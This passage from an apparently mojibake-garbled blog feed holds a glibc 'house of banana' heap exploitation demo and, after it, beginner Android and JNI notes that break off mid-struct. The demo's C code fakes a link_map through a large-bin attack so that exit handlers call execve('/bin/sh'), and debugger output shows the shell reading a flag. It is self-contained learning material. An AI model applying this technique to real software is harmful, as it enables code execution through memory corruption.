banana</h3><p>å‚è€ƒä¸€ä¸‹ <a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_bananaæºç åˆ†æ</a>è¿™ä¸€ç¯‡æ–‡ç« çš„demo</p><ul><li>æ³¨æ„æ”¹rtldç›¸å…³æŒ‡é’ˆå’Œlibcçš„åç§»å¤§å°</li></ul><p>makefile</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAFS := -g </span><br><span class="line"></span><br><span class="line">all: house_of_banana large_bin_attack</span><br><span class="line"><span class="keyword">default</span>: house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">TARGET := house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">house_of_banana: house_of_banana.c </span><br><span class="line">$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">large_bin_attack: large_bin_attack.c </span><br><span class="line">$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm -f $(TARGET) </span><br></pre></td></tr></table></figure><p>house of banana</p><ul><li>ä¼ªé€ ç»“æ„ä½“ l_next ä¸º 0</li><li>l_init_called ä¸€ä¸ªæ¯”è¾ƒç¥å¥‡çš„æ•°å­—ï¼Œå…·ä½“çš„libcæ‰“å°</li><li>ubuntu 22.04 LTS æµ‹è¯•ä¸€ä¸‹ï¼Œåœ¨gdb ä¸‹å¯ä»¥æ‰§è¡Œä¸€ä¸ªå‘½ä»¤å°±ä¼šå´©æºƒã€‚</li><li>é«˜ç‰ˆæœ¬libc æ²¡æœ‰patchè¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æ ¹æ®æºç å¯è¡Œï¼ˆç†è®ºä¸Šï¼‰</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">get_libc_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> to;</span><br><span class="line">  <span class="type">uint64_t</span> from;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">  FILE *file;</span><br><span class="line">  file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file)) &#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, buf);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;libc.so.6&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">      <span class="built_in">fclose</span>(file);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;libc =&gt; %#lx-%#lx\n&quot;</span>, from, to);</span><br><span class="line">      <span class="comment">// getchar();</span></span><br><span class="line">      <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_base = <span class="built_in">get_libc_base</span>();</span><br><span class="line">  <span class="type">uint64_t</span> rtld_global = libc_base + <span class="number">0x3fd040</span>;</span><br><span class="line">  <span class="comment">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">  <span class="type">uint64_t</span> *next_node = (<span class="type">uint64_t</span> *)(rtld_global - <span class="number">0x41ec8</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  <span class="comment">// force p1 insert in to the largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node - <span class="number">0x20</span>);  <span class="comment">// push p2 into unsoteded bin</span></span><br><span class="line">  <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);          <span class="comment">// force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç±»ä¼¼ä¸€ä¸ª uaf ä¿®æ”¹</span></span><br><span class="line">  <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2 - <span class="number">0x10</span>;  <span class="comment">// chunk_header</span></span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x28</span>) = fake;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x31c</span>) = <span class="number">0x4011d</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x110</span>) = fake + <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x48</span>) = fake + <span class="number">0x58</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x58</span>) = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x120</span>) = fake + <span class="number">0x48</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x50</span>) = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä¿®æ”¹ _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next çš„åœ°å€ä¸º p2</span></span><br><span class="line">  <span class="comment">// æœ€åä¸€ä¸ªlinkmapé“¾è¡¨éå† p2</span></span><br><span class="line">  <span class="comment">// å»ºè®® p *(struct link_map *) p2_addr çœ‹ä¸€ä¸‹</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// é—®é¢˜ï¼šassert i &lt; nloaded é”™è¯¯ï¼Œå› æ­¤è¦å°† (struct linkmap *p2) -&gt;l_next ç½®ä¸º0</span></span><br><span class="line">  p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// l_init_called ä¸º0</span></span><br><span class="line">  <span class="comment">// *(uint64_t*)(fake+0x31c) = 0x4011d; åƒæ˜¯ä¸€ä¸ªmagic number</span></span><br><span class="line">  <span class="comment">// å¿…é¡»ä¸ºå…¶ä½™ç±»å‹çš„å€¼ï¼Œå› æ­¤æ‰“å°å‡ºæ¥æ›¿æ¢</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// æœ€åçš„ç¨‹åºå´©æºƒäº†ğŸ˜¥.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax</span></span><br><span class="line"><span class="comment">  â–º 0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">    #0  0x000055555555529b in shell () at house_of_banana.c:7</span></span><br><span class="line"><span class="comment">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142</span></span><br><span class="line"><span class="comment">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,</span></span><br><span class="line"><span class="comment">    # ...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ä½†æ˜¯å‘ç°åœ¨gdb è°ƒè¯•æƒ…å†µä¸‹å¯ä»¥æ‰§è¡Œä¸€æ¬¡å‘½ä»¤å°±ä¼šå´©æºƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; c</span></span><br><span class="line"><span class="comment">Continuing.</span></span><br><span class="line"><span class="comment">process 6591 is executing new program: /usr/bin/dash</span></span><br><span class="line"><span class="comment">Error in re-setting breakpoint 2: Function &quot;shell&quot; not defined.</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">$ cat flag.txt</span></span><br><span class="line"><span class="comment">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]</span></span><br><span class="line"><span class="comment">[New inferior 2 (process 6594)]</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">[Detaching vfork parent process 6591 after child exec]</span></span><br><span class="line"><span class="comment">[Inferior 1 (process 6591) detached]</span></span><br><span class="line"><span class="comment">process 6594 is executing new program: /usr/bin/cat</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">flag&#123;house_of_banana_is_good&#125;</span></span><br><span class="line"><span class="comment">[Inferior 2 (process 6594) exited normally]</span></span><br><span class="line"><span class="comment">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE å…¥é—¨</a></li><li><a href="https://bbs.kanxue.com/thread-273895.htm">House of catæ–°å‹glibcä¸­IOåˆ©ç”¨æ‰‹æ³•è§£æ|å®‰å…¨æ‹›è˜|kanxue.com</a></li><li><a href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple ä¸€ç§æ–°çš„glibcä¸­IOæ”»å‡»æ–¹æ³•</a></li><li><a href="https://www.anquanke.com/post/id/222948">house of banana-å®‰å…¨å®¢</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-2</title>
      <link href="/2023/10/18/Android-2/"/>
      <url>/2023/10/18/Android-2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å®‰å“æ–°äººğŸ˜‹</p></blockquote><span id="more"></span><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><ol><li>Android Studio åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼Œç­‰å¾…gradle</li><li>æƒ³è¦runèµ·æ¥ï¼Œåˆ›å»ºä¸€ä¸ªdeviceã€‚åœ¨Android Studioé¡¶æ ï¼Œdevice manager -&gt; create.</li></ol><ul><li>ä»€ä¹ˆéƒ½å…ˆé€‰ç¬¬ä¸€ä¸ªï¼Œç¼ºä»€ä¹ˆä¸œè¥¿ä½¿ç”¨IDEä¸‹è½½</li></ul><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>Activityä»£è¡¨äº†ä¸€ä¸ªå…·æœ‰ç”¨æˆ·ç•Œé¢çš„å•ä¸€å±å¹•</p><p>Android åˆå§‹åŒ–æ˜¯é€šè¿‡ Activity ä¸­çš„ onCreate() å›è°ƒçš„è°ƒç”¨å¼€å§‹çš„ã€‚å­˜åœ¨æœ‰ä¸€åºåˆ—çš„å›è°ƒæ–¹æ³•æ¥å¯åŠ¨ä¸€ä¸ªæ´»åŠ¨ï¼ŒåŒæ—¶æœ‰ä¸€åºåˆ—çš„æ–¹æ³•æ¥å…³é—­æ´»åŠ¨</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>onCreate()</td><td>è¿™æ˜¯ç¬¬ä¸€ä¸ªå›è°ƒï¼Œåœ¨æ´»åŠ¨ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶è°ƒç”¨</td></tr><tr><td>onStart()</td><td>è¿™ä¸ªå›è°ƒåœ¨æ´»åŠ¨ä¸ºç”¨æˆ·å¯è§æ—¶è¢«è°ƒç”¨</td></tr><tr><td>onResume()</td><td>è¿™ä¸ªå›è°ƒåœ¨åº”ç”¨ç¨‹åºä¸ç”¨æˆ·å¼€å§‹å¯äº¤äº’çš„æ—¶å€™è°ƒç”¨</td></tr><tr><td>onPause()</td><td>è¢«æš‚åœçš„æ´»åŠ¨æ— æ³•æ¥å—ç”¨æˆ·è¾“å…¥ï¼Œä¸èƒ½æ‰§è¡Œä»»ä½•ä»£ç ã€‚å½“å‰æ´»åŠ¨å°†è¦è¢«æš‚åœï¼Œä¸Šä¸€ä¸ªæ´»åŠ¨å°†è¦è¢«æ¢å¤æ—¶è°ƒç”¨</td></tr><tr><td>onStop()</td><td>å½“æ´»åŠ¨ä¸åœ¨å¯è§æ—¶è°ƒç”¨</td></tr><tr><td>onDestroy()</td><td>å½“æ´»åŠ¨è¢«ç³»ç»Ÿé”€æ¯ä¹‹å‰è°ƒç”¨</td></tr><tr><td>onRestart()</td><td>å½“æ´»åŠ¨è¢«åœæ­¢ä»¥åé‡æ–°æ‰“å¼€æ—¶è°ƒç”¨</td></tr></tbody></table><h3 id="bundle"><a href="#bundle" class="headerlink" title="bundle"></a>bundle</h3><p>Bundleä¸»è¦ç”¨äº<strong>ä¼ é€’æ•°æ®</strong>ï¼šå®ƒä¿å­˜çš„æ•°æ®ï¼Œæ˜¯ä»¥key-value(é”®å€¼å¯¹)çš„å½¢å¼å­˜åœ¨çš„ã€‚</p><p>æˆ‘ä»¬ç»å¸¸ä½¿ç”¨<em>Bundleåœ¨Activityä¹‹é—´ä¼ é€’æ•°æ®</em>ï¼Œä¼ é€’çš„æ•°æ®å¯ä»¥æ˜¯booleanã€byteã€intã€longã€floatã€doubleã€stringç­‰åŸºæœ¬ç±»å‹æˆ–å®ƒä»¬å¯¹åº”çš„æ•°ç»„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡æˆ–å¯¹è±¡æ•°ç»„ã€‚å½“Bundleä¼ é€’çš„æ˜¯å¯¹è±¡æˆ–å¯¹è±¡æ•°ç»„æ—¶ï¼Œå®ç°SerializableÂ æˆ– Parcelable æ¥å£ã€‚</p><h3 id="å¸¸è§ç»„ä»¶"><a href="#å¸¸è§ç»„ä»¶" class="headerlink" title="å¸¸è§ç»„ä»¶"></a>å¸¸è§ç»„ä»¶</h3><ol><li>onclickï¼šç‚¹å‡»äº‹ä»¶</li><li>buttonï¼šæŒ‰é’®</li><li>EditTextï¼š<br>ç¼–è¾‘æ–‡æœ¬æ§ä»¶<br>ç¼–è¾‘æ¡†ï¼ˆEditTextï¼‰æ˜¯TextView çš„å­ç±»ï¼Œåœ¨TextView çš„åŸºç¡€ä¸Šå¢åŠ äº†æ–‡æœ¬ç¼–è¾‘åŠŸèƒ½ï¼Œç”¨äºå¤„ç†ç”¨æˆ·è¾“å…¥ï¼Œä¾‹å¦‚ç™»å½•æ¡†ç­‰ï¼Œæ˜¯éå¸¸å¸¸ç”¨çš„ç»„ä»¶ã€‚</li></ol><h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>android åˆ›å»ºä¸€ä¸ªç©ºé¡¹ç›®ï¼Œæ‰“å¼€hello xxxã€‚å…ˆä¸åœ¨æ„ç»†èŠ‚ï¼Œç›´æ¥ç¼–è¯‘ï¼Œå¯ä»¥ç›´æ¥è¿è¡Œï¼ˆåˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼‰</p><p>æ‰“åŒ…æˆAPKæ–‡ä»¶ï¼š</p><ol><li>Build -&gt; Build Bundles&#x2F;Apks -&gt; Build APKs</li><li>Build -&gt; Make Project ç„¶ååœ¨æ‰§è¡Œ1</li><li>è·¯å¾„ app&#x2F;build&#x2F;outputs&#x2F;apk</li></ol><p>å¦‚æœæ˜¯debugç‰ˆæœ¬ï¼Œéœ€è¦æ›´æ”¹ build variants ä¸º release</p><p>ç„¶åå°±å¯ä»¥åœ¨jadxä¸­åç¼–è¯‘çœ‹çœ‹ã€‚</p><h2 id="Native"><a href="#Native" class="headerlink" title="Native"></a>Native</h2><ol><li>Android Studioé€‰æ‹©åˆ›å»ºä¸€ä¸ªnative C++ é¡¹ç›®ï¼Œç­‰å¾…gradle</li><li>å‡ºç°ä¸€ä¸ª <code>cpp</code> çš„æ–‡ä»¶å¤¹ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦å†™çš„åº“ã€‚åŒæ—¶å­˜åœ¨javaæ–‡ä»¶å¤¹</li></ol><ul><li>deviceåˆ›å»ºæˆ–è€…ä½¿ç”¨å·²ç»å­˜åœ¨çš„</li></ul><ol start="3"><li>Javaå±‚å¯¼å…¥åº“</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123; System.loadLibrary(<span class="string">&quot;xxx&quot;</span>); &#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>åœ¨Javaä»£ç ä¸­å‡ºç°å¦‚ä¸‹çš„æ–¹æ³•</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">demo</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><h3 id="jni-h"><a href="#jni-h" class="headerlink" title="jni.h"></a>jni.h</h3><blockquote><p>åœ¨android ndk ä¸‹å¯ä»¥æ‰¾åˆ°ï¼Œç›´æ¥é‡‡ä½¿ç”¨ find å‘½ä»¤æ‰¾ã€‚</p></blockquote><ol><li>æŸäº›ç±»å‹</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span>* Â  Â  Â  Â  Â  jobject;</span><br><span class="line"><span class="keyword">typedef</span> jobject Â  Â  Â  Â  jclass;</span><br><span class="line"><span class="keyword">typedef</span> jobject Â  Â  Â  Â  jstring;</span><br><span class="line"><span class="keyword">typedef</span> jobject Â  Â  Â  Â  jarray;</span><br></pre></td></tr></table></figure><ol start="2"><li>JNIEnv å’Œ JavaVMå£°æ˜ï¼Œåœ¨Cå’ŒC++ ç”¨æ³•ä¸å¤ªç›¸åŒã€‚</li></ol><p>JNI å®šä¹‰äº†ä¸¤ä¸ªå…³é”®æ•°æ®ç»“æ„ï¼Œå³<code>JavaVM</code>å’Œ<code>JNIEnv</code>ã€‚ä¸¤è€…æœ¬è´¨ä¸Šéƒ½æ˜¯æŒ‡å‘å‡½æ•°è¡¨çš„äºŒçº§æŒ‡é’ˆã€‚ï¼ˆåœ¨ C++ ç‰ˆæœ¬ä¸­ï¼Œå®ƒä»¬æ˜¯ä¸€äº›ç±»ï¼Œè¿™äº›ç±»å…·æœ‰æŒ‡å‘å‡½æ•°è¡¨çš„æŒ‡é’ˆï¼Œå¹¶å…·æœ‰æ¯ä¸ªé€šè¿‡è¯¥å‡½æ•°è¡¨é—´æ¥è°ƒç”¨çš„ JNI å‡½æ•°çš„æˆå‘˜å‡½æ•°ã€‚ï¼‰JavaVM æä¾›<code>è°ƒç”¨æ¥å£</code>å‡½æ•°ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨æ­¤ç±»æ¥å‡½æ•°åˆ›å»ºå’Œé”€æ¯ JavaVMã€‚ç†è®ºä¸Šï¼Œæ¯ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ª JavaVMï¼Œä½† Android åªå…è®¸æœ‰ä¸€ä¸ªã€‚</p><p>JNIEnv æä¾›äº†å¤§éƒ¨åˆ† JNI å‡½æ•°ã€‚åŸç”Ÿå‡½æ•°éƒ½ä¼šæ”¶åˆ° JNIEnv ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JNIEnv</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* C_JNIEnv;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> _JavaVM JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNINativeInterface</span>* JNIEnv;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* JavaVM;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ol start="3"><li>JavaVM åŸå‹</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_JavaVM</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span>* functions;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__cplusplus)</span></span><br><span class="line">    <span class="function">jint <span class="title">DestroyJavaVM</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DestroyJavaVM</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThread</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">DetachCurrentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">DetachCurrentThread</span>(<span class="keyword">this</span>); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">GetEnv</span><span class="params">(<span class="type">void</span>** env, jint version)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">GetEnv</span>(<span class="keyword">this</span>, env, version); &#125;</span><br><span class="line">    <span class="function">jint <span class="title">AttachCurrentThreadAsDaemon</span><span class="params">(JNIEnv** p_env, <span class="type">void</span>* thr_args)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;<span class="built_in">AttachCurrentThreadAsDaemon</span>(<span class="keyword">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/*__cplusplus*/</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">JNIInvokeInterface</span> &#123;</span><br><span class="line">    <span class="type">void</span>*       reserved0;</span><br><span class="line">    <span class="type">void</span>*       reserved1;</span><br><span class="line">    <span class="type">void</span>*       reserved2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">jint</span>        